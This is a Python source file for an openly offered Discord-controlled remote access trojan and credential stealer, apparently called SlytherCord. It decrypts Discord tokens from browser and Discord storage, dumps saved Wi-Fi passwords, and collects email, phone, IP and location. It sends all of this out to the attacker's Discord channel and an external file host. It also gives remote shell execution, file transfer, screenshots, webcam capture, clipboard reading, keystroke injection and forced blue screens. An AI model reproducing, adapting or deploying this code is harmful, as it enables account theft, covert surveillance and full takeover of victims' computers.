import discord
import os
import pyautogui
import asyncio
import sys
import requests
import subprocess
import string


from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from datetime import datetime
from uuid import getnode as get_mac
from Settings import *
from cv2 import VideoCapture, imwrite, CAP_DSHOW
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from base64 import b64decode
from os import listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from PIL import Image, ImageDraw, ImageFont
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER


file_api = "https://api.letsupload.cc/upload"
wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""
global grabembed

tokens = []
cleaned = []
checker = []





def start_program():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                global tok
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        global ip, pc_name, pc_username, email, phone, mfa_enabled, nitro_statement
                        
                        res_json = res.json()
                        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        if has_nitro: 
                            nitro_statement = "✅"
                        else:    
                            nitro_statement = "❌Blud has no nitro indeed"
                    
                         
                        

                        
                        

                else: continue
                print("e")


def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
new_ascii = """ 

 .d8888b.  888          888    888                        .d8888b.                       888 
d88P  Y88b 888          888    888                       d88P  Y88b                      888 
Y88b.      888          888    888                       888    888                      888 
 "Y888b.   888 888  888 888888 88888b.   .d88b.  888d888 888         .d88b.  888d888 .d88888 
    "Y88b. 888 888  888 888    888 "88b d8P  Y8b 888P"   888        d88""88b 888P"  d88" 888 
      "888 888 888  888 888    888  888 88888888 888     888    888 888  888 888    888  888 
Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888    Y88b 888 
 "Y8888P"  888  "Y88888  "Y888 888  888  "Y8888  888      "Y8888P"   "Y88P"  888     "Y88888 
                    888                                                                      
               Y8b d88P                                                                      
                "Y88P"  -Made by Isaaclins

    Usage:
    .help               - Shows this message
    .ping               - latency delay of the bot
    .cd <directory>     - Change Directory   
    .ls                 - List Directory
    .export <file>      - export File into link
    .upload <link>      - Upload File from link
    .cmd <cmd>          - Execute CMD Command 
    .run <file>         - Run an File   
    .screenshot OR .ss  - Take a Screenshot of the first monitor
    .blue               - sends a bluescreen ;)
    .start              - Adds the bot to the startup directory
    .exit               - closes the connection to the bot  
    .reload            - reloads the connection to the bot                                           
"""
commands = "\n".join([
    ".help               - Shows this message",
    ".ping               - latency delay of the bot",
    ".cd <directory>     - Change Directory",
    ".ls                 - List Directory",
    ".export <file>      - export File into link",
    ".upload <link>      - Upload File from link",
    ".cmd <cmd>          - Execute CMD Command",
    ".run <file>         - Run an File",
    ".ss                 - Take a Screenshot of the first monitor",
    ".blue               - sends a bluescreen ;)",
    ".start              - Adds the bot to the startup directory",
    ".exit               - closes the connection to the bot",
    ".reload            - reloads the connection to the bot"
])
intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)

async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None
async def reload_program():
    python = sys.executable
    script = os.path.abspath(__file__)
    subprocess.call([python, script])
    sys.exit()
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
global mac_address
mac_address = str(get_mac())
@client.event
async def on_ready():
    start_program()
    try:
        output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
        decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
        file_name = f"SSID_{mac_address}.txt"
        with open(file_name, 'w') as file:
            file.write(decoded_wifi_pwd)
        SSIDlink = requests.post(file_api, files={"file": open(file_name, "rb")}).json()["data"]["file"]["url"]["full"]
        os.remove(file_name)
    except Exception as e:
        SSIDlink = None
    response = requests.get('https://ipapi.co/json/')
    data = response.json()
    city = data.get('city')
    country = data.get('country')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    username = os.getlogin()
    grabembed=discord.Embed(title="**Grabbed info from: ** ```" + pc_username +"```",colour=0x3)
    grabembed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
    grabembed.add_field(name="**Token:**",value=f"```{tok}```",inline=True)
    
    grabembed.add_field(name="**Email:**",value=f"```{email}```",inline=True)
    grabembed.add_field(name="**Username:**",value=f"```{pc_username}```",inline=True)
    grabembed.add_field(name="**PC Name:**",value=f"```{pc_name}```",inline=True)
    grabembed.add_field(name="**Phone number:**", value=f"```{phone}```",inline=True)
    grabembed.add_field(name="**MFA Enabled?**", value=f"```{mfa_enabled}```",inline=True)
    grabembed.add_field(name="**Does blud have Nitro?**", value=f"```{nitro_statement}```",inline=True)
    grabembed.add_field(name="**IP Address:**",value=f"```{ip}```",inline=True)
    grabembed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
    grabembed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
    grabembed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
    grabembed.add_field(name="**City:**",value=f"```{city}```",inline=True)
    grabembed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
    try:
        grabembed.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
    except Exception as err:
        grabembed.add_field(name="**SSID & Passwords:**",value=f"ERROR: Not able to extract. error message: \n {err}",inline=True)
    grabembed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
    grabembed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
    grabembed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
    grabembed.timestamp = datetime.utcnow()



    guild = client.get_guild(int(guild_id))
    channel = await find_channel_by_name(guild, mac_address)
    if channel:
        await channel.send(embed=grabembed)
    else:
        channel = await guild.create_text_channel(mac_address)
        e = await channel.send(embed=grabembed)
        await e.pin()
        await channel.send("hello world")
@client.event
async def on_message(message):
    guild = client.get_guild(int(guild_id))
    if message.author != client.user: 
        channel = await find_channel_by_name(guild, mac_address)   
        if message.channel.name == mac_address: 
            
            match message.content.lower():
                case ".help":
                    embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
                    await message.reply(embed=embed)
                case ".ping":
                    await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
                case ".ls":
                    import os
                    files = "\n".join(os.listdir())
                    if files == "":
                        files = "No Files Found"
                    embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                    await message.reply(embed=embed)  
                case ".exit":
                    new_msg = await message.reply("Are you sure you want to destroy the connection?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")
                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                           await message.channel.delete()
                           await client.close()
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")
                case ".blue":
                    new_msg = await message.reply("Are you sure you want to start a bluescreen?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")

                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                            await message.reply("Attempting...", delete_after = .1)
                            ntdll = ctypes.windll.ntdll
                            prev_value = ctypes.c_bool()
                            res = ctypes.c_ulong()
                            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                            if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                                await message.reply("Blue Successful!")
                            else:
                                await message.reply("Blue Failed! :(")
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled bluescreen.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")
                case ".ss":
                    screenshot = pyautogui.screenshot()
                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                    screenshot.save(path)
                    file = discord.File(path)
                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
                    embed.set_image(url="attachment://screenshot.png")
                    await channel.send(embed=embed, file=file) 
                    await message.delete()
                case ".screenshot":
                    screenshot = pyautogui.screenshot()
                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                    screenshot.save(path)
                    file = discord.File(path)
                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
                    embed.set_image(url="attachment://screenshot.png")
                    await channel.send(embed=embed, file=file) 
                    await message.delete()
                case ".photo":
                    webcam = VideoCapture(0, CAP_DSHOW)
                    result, image = webcam.read()
                    imwrite('webcam.png', image)
                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +mac_address+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                    subprocess.run('del webcam.png', shell=True)
                    await message.delete()
                case ".purge":  
                    await message.reply('Purging...')
                    await message.channel.purge(limit=None) 
                case ".reload":

                    new_msg = await message.reply("Are you sure you want to Reload the connection?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")
                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                           await message.channel.send("reloading, please be patient...", delete_after =.5)
                           loadingscreen = await message.channel.send("https://cdn.discordapp.com/emojis/697961731099590787.gif?size=128&quality=lossless")
                           await reload_program()
                           await loadingscreen.delete()
                           
                           await client.close()
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")             
                case ".volumeup":
                    new_msg = await message.reply("Increasing the volume")
                    volumeup()
                    await channel.send("Volume is set to 100%")
                case ".volumedown" :
                    new_msg = await message.reply("Decreasing the volume")
                    volumedown()
                    await channel.send("Volume is set to 0%")
                case ".admincheck":
                    import ctypes
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    if is_admin == True:
                        await message.channel.send("Congrats, you're admin")
                    elif is_admin == False:
                        await message.channel.send(" Sorry, you're not admin <https://cdn.discordapp.com/emojis/661443224237375488.webp?size=128&quality=lossless>")
                case ".location":
                    import urllib.request
                    import json
                    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                        data = json.loads(url.read().decode())
                        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                        await message.channel.send("Here is the location: " + link)
                case ".clipboard":
                    import ctypes
                    import os
                    CF_TEXT = 1
                    kernel32 = ctypes.windll.kernel32
                    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
                    kernel32.GlobalLock.restype = ctypes.c_void_p
                    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
                    user32 = ctypes.windll.user32
                    user32.GetClipboardData.restype = ctypes.c_void_p
                    user32.OpenClipboard(0)
                    if user32.IsClipboardFormatAvailable(CF_TEXT):
                        data = user32.GetClipboardData(CF_TEXT)
                        data_locked = kernel32.GlobalLock(data)
                        text = ctypes.c_char_p(data_locked)
                        value = text.value
                        kernel32.GlobalUnlock(data_locked)
                        body = value.decode()
                        user32.CloseClipboard()
                        await message.channel.send(f"Clipboard content is : \n``` {body}```")
                case ".wallpaper":
                    import ctypes
                    import os
                    path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                    await message.attachments[0].save(path)
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                    await message.reply("changed wallpaper")


            if message.content.lower().startswith(".export"):
                file = message.content[8:]
                try:
                    link = requests.post(file_api, files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                    embed = discord.Embed(title="Export", description=f"```{link}```", color=0xfafafa)
                    await message.reply(embed=embed)
                except:
                    embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                    await message.reply(embed=embed)
            elif message.content.lower().startswith(".upload"):
                link = message.content[8:]
                file = requests.get(link).content
                file_name = os.path.basename(link)
                file_name = file_name.rsplit('_', 1)[0] + '.' + file_name.rsplit('_', 1)[1]
                with open(file_name, "wb") as f:
                    f.write(file)
                embed = discord.Embed(title="Upload", description=f"```{file_name}```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".shell"):
                command = message.content[7:]
                output = subprocess.Popen(
                    ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                ).communicate()[0].decode("utf-8")
                if output == "":
                    output = "No output"
                embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".run"):
                command = message.content[5:]
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='utf-8')
                    embed = discord.Embed(title="Command Output", description=f"```{output}```", color=0xfafafa)
                except subprocess.CalledProcessError as e:
                    output = e.output
                    embed = discord.Embed(title="Command Error", description=f"```{output}```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".cd"):
                directory = message.content[4:]
                
                try:
                    os.chdir(directory)
                    files = "\n".join(os.listdir())
                    if files == "":
                        files = "No Files Found"
                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                except:
                    embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                await message.reply(embed=embed)
                await message.delete()
            elif message.content.lower().startswith(".input"):
                command = message.content[7:].split()
                key1 = command[0]
                key2 = command[1] if len(command) > 1 else ""
                key3 = command[2] if len(command) > 2 else ""

                keys = [key1, key2, key3]
                hotkey = "+".join(keys)

                new_msg = await message.reply(f"are you sure you want to send this keystroke? \n ``{hotkey}``")
                await new_msg.add_reaction("✅")
                await new_msg.add_reaction("❌")
                def check(reaction, user):
                    return user == message.author and str(reaction.emoji) in ["✅", "❌"]
                try:
                    reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                    if str(reaction.emoji) == "✅":
                        try:
                            pyautogui.hotkey(*keys)
                            e = await channel.send("Sent keystroke: " + str(keys))
                            await message.delete()
                            await e.delete()
                            await new_msg.delete()
                        except Exception as e:
                            await channel.send(f"Failed to send keystroke: {hotkey} \nError: {str(e)}")
                            await message.delete()
                            await new_msg.delete()

                    elif str(reaction.emoji) == "❌":
                        delmsg =await message.channel.send(f"Cancelled key press:{hotkey}")
                        await message.delete()
                        await new_msg.delete()
                        await delmsg.delete()
                except asyncio.TimeoutError:
                    await message.channel.send("You didn't react in time.")
            elif message.content.lower().startswith(".type"):
                content = message.content[6:]
                new_msg = await message.reply(f"are you sure you want to type this in as a keyboard? \n ``{content}``")
                await new_msg.add_reaction("✅")
                await new_msg.add_reaction("❌")
                def check(reaction, user):
                    return user == message.author and str(reaction.emoji) in ["✅", "❌"]
                try:
                    reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                    if str(reaction.emoji) == "✅":
                        try:
                            pyautogui.typewrite(content)

                            e = await channel.send("Sent: " + content)
                            await message.delete()
                            await e.delete()
                            await new_msg.delete()
                        except Exception as e:
                            await channel.send(f"Failed to send keystroke: {content} \nError: {str(e)}")
                            await message.delete()
                            await new_msg.delete()

                    elif str(reaction.emoji) == "❌":
                        delmsg =await message.channel.send(f"Cancelled to type: {content}")
                        await message.delete()
                        await new_msg.delete()
                        await delmsg.delete()
                except asyncio.TimeoutError:
                    await message.channel.send("You didn't react in time.")
            elif message.content.lower().startswith(".say"):
                content = message.content[4:]
                volumeup()
                import comtypes
                import win32com.client as wincl
                speak = wincl.Dispatch("SAPI.SpVoice")
                speak.Speak(str(content))
                comtypes.CoUninitialize()
                await message.channel.send(f"just said ``{content}`` successfully")
            elif message.content.lower().startswith(".message"):
                content = message.content[9:]
                import ctypes
                import time
                MB_YESNO = 0x04
                MB_HELP = 0x4000
                ICON_STOP = 0x10
                def mess():
                    ctypes.windll.user32.MessageBoxW(0, content, "Error", MB_HELP | MB_YESNO | ICON_STOP)
                import threading
                messa = threading.Thread(target=mess)
                messa._running = True
                messa.daemon = True
                messa.start()
                import win32con
                import win32gui
                import time
                time.sleep(1)
                hwnd = win32gui.FindWindow(None, "Error") 
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            elif message.content.lower().startswith(".mouse"):
                command = message.content[7:]
                if command.lower() == "":
                    grid_size = 100
                    size = "large"
                elif command.lower() == "large" or command.lower() == "l":
                    grid_size = 100
                    size = "large"
                elif command.lower() == "medium" or command.lower() == "m":
                    grid_size = 75
                    size = "medium"
                elif command.lower() == "small" or command.lower() == "s":
                    grid_size = 50
                    size = "small"
                elif command.lower() == "tiny" or command.lower() == "t":
                    await message.reply("This is a WIP. Please refrain from using this size.")
                    grid_size = 25
                    size = "tiny"
                else:
                    await message.channel.send("Invalid grid size.\nValid values are: large, medium, small, tiny")
                    return

                screenshot = pyautogui.screenshot()
                overlay = Image.new('RGBA', screenshot.size, (0, 0, 0, 0))
                grid_color = (255, 0, 0, 255)  
                
                grid_dimension = min(screenshot.width // grid_size, screenshot.height // grid_size)
                labels = string.ascii_uppercase[:grid_dimension] if grid_dimension <= 26 else string.ascii_uppercase * (grid_dimension // 26) + string.ascii_uppercase[:grid_dimension % 26]
                for x in range(0, screenshot.width, grid_size):
                    for y in range(0, screenshot.height, grid_size):
                        overlay.putpixel((x, y), grid_color)
                        label_x = labels[x // grid_size % grid_dimension]
                        label_y = y // grid_size + 1
                        label = f"{label_x}{label_y}"
                        draw = ImageDraw.Draw(overlay)
                        
                  
                        label_width, label_height = draw.textsize(label)
                        label_position = ((x + grid_size // 2) - label_width // 2, (y + grid_size // 2) - label_height // 2)
                        
                       
                        font = ImageFont.truetype("arial.ttf", 20)
                        draw.text(label_position, label, fill=(255, 255, 255), font=font, outline=(0, 0, 0))
                
                for x in range(0, screenshot.width, grid_size):
                    for y in range(screenshot.height):
                        overlay.putpixel((x, y), grid_color)
                
                for y in range(0, screenshot.height, grid_size):
                    for x in range(screenshot.width):
                        overlay.putpixel((x, y), grid_color)
                
                global gridresult
                gridresult = Image.alpha_composite(screenshot.convert('RGBA'), overlay)
                path = os.path.join(os.getenv("TEMP"), "finishedscreenshot.png")
                gridresult.save(path)
                file = discord.File(path)
                embed = discord.Embed(title=f"Screenshot with {size} size", color=0xfafafa)
                embed.set_image(url="attachment://finishedscreenshot.png")
                await channel.send(embed=embed, file=file) 
                await message.delete() 

    else:
        print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)

client.run(bot_token)
